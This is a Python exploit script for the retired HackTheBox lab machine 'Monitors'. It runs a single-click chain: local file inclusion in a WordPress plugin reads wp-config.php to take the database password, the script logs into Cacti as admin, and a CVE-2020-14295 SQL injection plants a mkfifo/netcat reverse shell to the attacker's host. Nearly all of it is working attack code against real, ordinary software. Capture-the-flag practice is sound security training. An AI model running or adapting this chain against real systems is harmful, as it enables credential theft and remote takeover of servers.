# Monitors LFI - SQLi - Command Injection (RCE) single click exploit
# Hackthebox - Monitors (retired) - https://app.hackthebox.com/machines/Monitors/information
# Author: d1Zzy666
# Date: 12-12-2024

"""
Plan:
+ Enumerate password with LFI : 
    /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//var/www/wordpress/wp-config.php
+ Enumerate additional hostname with LFI and print notice to write to /etc/hosts : 
    /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/apache2/sites-enabled/000-default.conf
+ Extract CSRF token from Cacti default page.
+ Log into session as ADMIN.
+ CVE-2020-14295 : SQL injection stacked query to inject command into color.php via "filter" parameter. 
    GET /cacti/color.php?action=export&filter=1
+ Return netcat shell.
    GET /cacti/host.php?action=reindex
"""
# Libraries & imports etc.
from bs4 import BeautifulSoup
from multiprocessing import Process
import os
import re
import requests
import sys
import threading
import urllib.parse
from termcolor import colored

# Print help menu
def print_help():
    help_message = """
    Usage: python3 htb-monitors-sqli-to-command-injection.py [OPTIONS] LHOST LPORT
    
    Description:
      This script requires two positional arguments:
        LHOST   The localhost (KALI) IP or domain
        LHOST   The localhost (KALI) reverse shell port
    
    Options:
      -h, --help      Show this help message and exit
    
    Example:
      python3 full-chain-exploit.py 192.168.1.10 1337
    """
    print(help_message)

def validate_arguments():
    # Display help if no arguments or "-h"/"--help" is passed
    if len(sys.argv) == 1 or "-h" in sys.argv or "--help" in sys.argv:
        print_help()
        sys.exit(0)

    # Ensure exactly two positional arguments are provided
    if len(sys.argv) != 3:
        print("Error: You must provide exactly two arguments: LHOST and LPORT.")
        print_help()
        sys.exit(1)

# Validate arguments before proceeding with the rest of the script
validate_arguments()

# Global variables - UPDATE as required
LHOST = sys.argv[1]                        
LPORT = sys.argv[2]
target = "monitors.htb"
targetport = 80

cactiuser = "admin"
cactipassword = None
cactihostname = None

csrf_token = None

session = requests.session()

# Proxy via BURP
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# Netcat session (1337)
print(colored(f"Starting Netcat Shell (tcp {LPORT})...", "red"))
threading.Thread(target=os.system, args=(f'nc -lvnp {LPORT}',) ).start()
print("\n")

# Exfil admin password via LFI
def getPasswd():
    global cactipassword
    lfi1 = f"/var/www/wordpress/wp-config.php"
    url = f"http://{target}:80/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../{lfi1}"
    x = session.get(url, proxies=proxies, verify=False)
    # String to search using regex
    # Search response text using x.text
    # String being search: 
    #       define( 'DB_PASSWORD', 'PASSWORDHERE' );
    """
        \s searches whitespace, with * means one or more times.
        Search for string 'DB_PASSWORD',
        Search for 1st capture group - '([^']+)'
        Match a single character not present in the list below [^'] in other words the password.
        \s searches whitespace, with * means one or more times.        
    """
    print(colored("[+] Getting Admin Password.", "green"))
    password_pattern = r"define\(\s*'DB_PASSWORD',\s*'([^']+)'\s*\);"
    match = re.search(password_pattern, x.text)
    if match:
        cactipassword = match.group(1)  # Group 1 contains the captured password
        print("Password captured!", colored(f"{cactipassword}", "blue"))
    else:
        print("Password not found.")
    #print(cactipassword)

# Exfil Cacti hostname via LFI
def getHostname():
    global cactihostname
    lfi2 = f"/etc/apache2/sites-enabled/000-default.conf"
    url = f"http://{target}:80/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../{lfi2}"

    y = session.get(url, proxies=proxies, verify=False)
    # String to search using regex
    print(colored("[+] Getting CACTI hostname.", "green"))
    hostname_pattern = r"#\s+Add\s+([a-zA-Z0-9-]+)\.monitors\.htb"
    match = re.search(hostname_pattern, y.text)
    if match:
        cactisubdomain = match.group(1)  # Group 1 contains the captured password
        print("Hostname captured!")
    else:
        print("Hostname not found.")
    cactihostname = cactisubdomain + ".monitors.htb"
    print(f"Please enter hostname", colored(f"{cactihostname}", "blue"), "into your local /etc/hosts")
    answer = input("Have you entered it into your /etc/hosts? (yes or no):")
    if answer.lower() in ["yes", "y"]:
        print("Continuing...")
    else: 
        print("You need to update your /etc/hosts file. Exiting.")
        os._exit(0) # Exit program

# Extract CSRF token
def getCSRF():
    url = f"http://{cactihostname}:80/cacti/index.php"
    # Fetch the page
    response = session.get(url, proxies=proxies, verify=False)

    # Check if the request was successful
    if response.status_code != 200:
        print(f"Failed to fetch the page. Status code: {response.status_code}")
        exit()

    # Parse the HTML content using BeautifulSoup
    soup = BeautifulSoup(response.text, 'html.parser')

    # Find all script tags
    script_tags = soup.find_all('script')

    # Search for csrfMagicToken in the script content
    global csrf_token
    print(colored("[+] Getting CSRF Token for re-use.", "green"))
    for script in script_tags:
        # Check if script.string is not None and contains csrfMagicToken
        if script.string and 'csrfMagicToken' in script.string:
            # Use regex to extract the csrfMagicToken value
            csrf_token_match = re.search(r"csrfMagicToken\s*=\s*['\"]([^'\"]+)['\"]", script.string)
            if csrf_token_match:
                csrf_token = csrf_token_match.group(1)
                break

    if csrf_token:
        print(f"CSRF Token:", colored(f"{csrf_token}", "blue"))
    else:
        print("CSRF token not found in the script content!")

# Re-use password & CSRF token to login as "Admin"
def doAdminLogin():
    url = f"http://{cactihostname}:80/cacti/index.php"
    data = {
        "__csrf_magic": f"{csrf_token}", 
        "action": "login", 
        "login_username": f"{cactiuser}", 
        "login_password": f"{cactipassword}"
        }
    admin_login_request = session.post(url, data=data, proxies=proxies, verify=False)
    if "Invalid User Name/Password Please Retype" in admin_login_request.text:
        print(colored("[-] Unable to log in. Check your credentials!", "red"))
        os._exit(0) # Exit program
    else:
        print(colored("[+] Successfully logged in as Admin!", "green"))

# SQL injection, commmand injection
def doSQLi():
    # Inject payload - urllib parse is used to url encode payload safely. 
    shell = urllib.parse.quote(f"""rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f""")
    ping = f"ping+-c+5+{LHOST}"         # For testing.
    payload= f"""')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value='{shell};'+where+name='path_php_binary';--+-"""
    
    url = f"http://{cactihostname}:80/cacti/color.php?action=export&filter=1{payload}"
    session.get(url, proxies=proxies, verify=False)
    print(colored("[+] Payload injected!", "green"))

    # Log out
    print(colored("[+] Logging out of Admin.", "green"))
    url2 = f"http://{cactihostname}:80/cacti/logout.php"
    session.get(url2, proxies=proxies, verify=False)

# Log back in as admin. 
def doAdminLogin2():
    url = f"http://{cactihostname}:80/cacti/index.php"
    data = {
        "__csrf_magic": f"{csrf_token}", 
        "action": "login", 
        "login_username": f"{cactiuser}", 
        "login_password": f"{cactipassword}"
        }
    admin_login_request = session.post(url, data=data, proxies=proxies, verify=False)
    if "Invalid User Name/Password Please Retype" in admin_login_request.text:
        print(colored("[-] Unable to log in. Check your credentials!", "red"))
        os._exit(0) # Exit program
    else:
        print(colored("[+] Successfully logged in as Admin!", "green"))
        print(colored("[++++] You've g0t shell! [++++]", "green"))

# Execute command injection. 
def doCmdInj():  
    url = f"http://{cactihostname}:80/cacti/host.php?action=reindex"
    #headers2 = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1"}
    session.get(url, proxies=proxies) 

# Order of functions
if __name__ == "__main__":
    getPasswd()
    getHostname()
    getCSRF()
    doAdminLogin()
    doSQLi()            # Session logs out here
    getCSRF()
    doAdminLogin2()
    doCmdInj()